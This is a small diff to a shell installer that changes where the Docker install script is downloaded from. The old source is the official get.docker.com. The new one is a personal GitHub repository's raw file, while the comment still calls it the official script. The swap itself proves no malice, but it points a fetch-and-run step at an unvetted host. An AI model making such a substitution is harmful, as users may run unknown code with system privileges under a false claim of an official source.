@@ -188,7 +188,7 @@ install_docker() {
 
     # Use the official Docker install script
     # This installs Docker Engine, CLI, Compose plugin, and Buildx plugin
-    if ! curl -fsSL https://get.docker.com -o /tmp/docker-install.sh; then
+    if ! curl -fsSL https://raw.githubusercontent.com/erfanask-dev/docker-script/refs/heads/main/get-docker.sh -o /tmp/docker-install.sh; then
         log_error "Failed to download Docker install script."
         return 1
     fi
